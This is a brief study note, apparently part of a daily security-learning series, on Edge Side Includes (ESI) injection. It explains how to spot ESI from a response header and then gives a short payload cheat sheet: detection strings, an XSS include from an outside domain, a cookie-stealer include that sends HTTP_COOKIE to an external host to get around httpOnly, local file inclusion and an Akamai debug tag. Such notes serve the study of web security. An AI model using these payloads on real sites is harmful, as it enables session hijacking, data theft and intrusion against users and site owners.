Daily Notes : Day 82
ESI Injection. - Part 1

ESI (Edge Side Includes) is utilized to manage caching issues with dynamic applications. It employs ESI tags to specify dynamic content that should be generated before sending the cached version. However, if an attacker inserts an ESI tag into the cache content, they can inject arbitrary content into the document before it reaches users.

The following header in a response from the server means that the server is using ESI:
Surrogate-Control: content="ESI/1.0"

Basic detection
hell<!--esi-->o 
If previous is reflected as "hello", it's vulnerable

Blind detection
<esi:include src=http://<domain>.com>

XSS Exploitation Example
<esi:include src=http://<domain>.com/XSSPAYLOAD.html>

Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://<domain>.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

Valid for Akamai, sends debug information in the response
<esi:debug/>

Further exploitation in part 2 
